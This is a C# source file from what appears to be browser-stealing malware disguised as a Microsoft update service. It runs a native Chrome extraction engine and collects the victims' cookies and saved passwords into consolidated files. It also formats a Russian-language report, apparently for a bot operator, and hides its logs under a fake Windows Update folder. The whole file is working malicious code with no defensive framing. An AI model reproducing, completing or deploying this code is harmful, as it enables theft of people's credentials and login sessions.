using System;
using System.IO;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.IO.Compression;
using Newtonsoft.Json.Linq;
using Microsoft.Data.Sqlite;
using FinalBot;
using VanguardCore;
using VanguardCore.Modules;
using System.Diagnostics;
using System.Threading;

namespace Microsoft.UpdateService.Modules
{
    public class BrowserResult
    {
        public bool Success { get; set; }
        public string Message { get; set; } = "";
        public string OutputDir { get; set; } = "";
        public string LogSnippet { get; set; } = "";
        public int CookieCount { get; set; } = 0;
        public int PasswordCount { get; set; } = 0;
    }

    public class DataService
    {
        private string lastOutput = "";
        private string lastError = "";

        private static void Log(string msg)
        {
            try {
                string line = $"[{DateTime.Now:HH:mm:ss}] [BROWSER] {msg}";
                Console.WriteLine(line);
                string logDir = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update");
                if (!Directory.Exists(logDir)) Directory.CreateDirectory(logDir);
                string logPath = Path.Combine(logDir, "svc_debug.log");
                File.AppendAllText(logPath, line + Environment.NewLine);
            } catch { }
        }

        public async Task<BrowserResult> RunCompleteSteal()
        {
            var result = new BrowserResult();
            try
            {
                string tempBase = Path.Combine(Path.GetTempPath(), "MsUpdateSvc");
                if (!Directory.Exists(tempBase)) Directory.CreateDirectory(tempBase);
                
                string vOutputDir = Path.Combine(tempBase, "VOutput");
                if (Directory.Exists(vOutputDir)) try { Directory.Delete(vOutputDir, true); } catch { }
                Directory.CreateDirectory(vOutputDir);

                Log("[BROWSER] Starting Absolute Extraction...");
                
                // Phase 1: Run the actual injector
                await RunChromelevator(vOutputDir);

                // Phase 2: Search for results (Agessive Search)
                string foundDir = "";
                
                // 1. Check specified VOutput
                if (Directory.Exists(vOutputDir) && Directory.GetDirectories(vOutputDir).Length > 0)
                    foundDir = vOutputDir;
                
                // 2. Check default 'output' in WorkDir (elevator might ignore -o if 'all' is used)
                if (string.IsNullOrEmpty(foundDir)) {
                    string alt1 = Path.Combine(ResourceModule.WorkDir, "output");
                    if (Directory.Exists(alt1) && Directory.GetDirectories(alt1).Length > 0)
                        foundDir = alt1;
                }
                
                // 3. Check current dir 'output'
                if (string.IsNullOrEmpty(foundDir)) {
                    string alt2 = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "output");
                    if (Directory.Exists(alt2) && Directory.GetDirectories(alt2).Length > 0)
                        foundDir = alt2;
                }

                if (!string.IsNullOrEmpty(foundDir))
                {
                    // Consolidate files (Cookies/Passwords)
                    var stats = ConsolidateData(foundDir);
                    result.CookieCount = stats.cookies;
                    result.PasswordCount = stats.passwords;

                    var subDirs = Directory.GetDirectories(foundDir);
                    var names = subDirs.Select(d => Path.GetFileName(d).ToUpper()).ToList();
                    
                    result.Success = true;
                    result.OutputDir = foundDir;
                    result.Message = $"📁 <b>Браузеры:</b> {string.Join(", ", names)}\n🍪 <b>Cookies:</b> {result.CookieCount}\n🔑 <b>Passwords:</b> {result.PasswordCount}";
                    Log($"[BROWSER] Success! Found data in: {foundDir} (C:{result.CookieCount}, P:{result.PasswordCount})");
                }
                else
                {
                    result.Success = false;
                    string snippet = string.IsNullOrEmpty(lastOutput) ? (string.IsNullOrEmpty(lastError) ? "Экстрактор не вернул лог." : lastError) : lastOutput;
                    if (snippet.Length > 300) snippet = "..." + snippet.Substring(snippet.Length - 300);
                    
                    result.Message = $"⚠️ <b>Ошибка сбора:</b> Данные не найдены.\n<code>{snippet.Replace("<", "&lt;").Replace(">", "&gt;")}</code>";
                    Log("[BROWSER] Extraction failed or returned empty output.");
                }
            }
            catch (Exception ex)
            {
                result.Success = false;
                result.Message = $"❌ <b>Критическая ошибка:</b> {ex.Message}";
                Log($"[BROWSER] Exception: {ex}");
            }
            return result;
        }

        private (int cookies, int passwords) ConsolidateData(string rootDir)
        {
            int totalCookies = 0;
            int totalPasswords = 0;
            var allCookies = new JArray();
            var allPasswords = new StringBuilder();
            allPasswords.AppendLine("================================================================================");
            allPasswords.AppendLine("                           CONSOLIDATED PASSWORDS                               ");
            allPasswords.AppendLine("================================================================================" + Environment.NewLine);

            try
            {
                var files = Directory.GetFiles(rootDir, "*.*", SearchOption.AllDirectories);
                foreach (var file in files)
                {
                    string name = Path.GetFileName(file).ToLower();
                    
                    // Improved matching: find ANY file containing "cookie" or "pass"
                    if (name.Contains("cookie"))
                    {
                        try {
                            string content = File.ReadAllText(file);
                            if (content.Trim().StartsWith("[")) // JSON Array
                            {
                                var json = JArray.Parse(content);
                                foreach (var item in json) allCookies.Add(item);
                                totalCookies += json.Count;
                            }
                        } catch { }
                    }
                    else if (name.Contains("pass") || name.EndsWith(".txt") || name.EndsWith(".log"))
                    {
                        try {
                            string content = File.ReadAllText(file);
                            if (content.Contains("URL:") || content.Contains("Password:") || content.Contains("Login:")) 
                            {
                                string parentDir = Path.GetFileName(Path.GetDirectoryName(file)) ?? "Unknown";
                                allPasswords.AppendLine($"--- SOURCE: {parentDir} ({name}) ---");
                                allPasswords.AppendLine(content);
                                allPasswords.AppendLine(Environment.NewLine);
                                
                                // Count matches of "URL:" as proxy for credential count
                                int matches = Regex.Matches(content, "URL:", RegexOptions.IgnoreCase).Count;
                                totalPasswords += (matches > 0 ? matches : 1);
                            }
                        } catch { }
                    }
                }

                if (totalCookies > 0)
                    File.WriteAllText(Path.Combine(rootDir, "Vanguard_All_Cookies.json"), allCookies.ToString());
                
                if (totalPasswords > 0)
                    File.WriteAllText(Path.Combine(rootDir, "Vanguard_All_Passwords.txt"), allPasswords.ToString());
            }
            catch (Exception ex) { Log($"[BROWSER] Consolidation error: {ex.Message}"); }

            return (totalCookies, totalPasswords);
        }

        private async Task RunChromelevator(string vOutputDir)
        {
            try
            {
                Log($"[BROWSER] Executing Native Engine: ChromeEngine.ExtractAll({vOutputDir})");
                
                // V6.18: Wait for initialization stability (3s)
                await Task.Delay(3000);

                // V6.18+ Call (Statically Linked)
                bool success = await Task.Run(() => ChromeEngine.ExtractAll(vOutputDir));
                
                if (success)
                    Log("[BROWSER] Native Engine: Success");
                else
                    Log("[BROWSER] Native Engine: Failed or returned errors");
            }
            catch (Exception ex) { Log($"[BROWSER] Native Engine error: {ex.Message}"); }
        }
    }
}
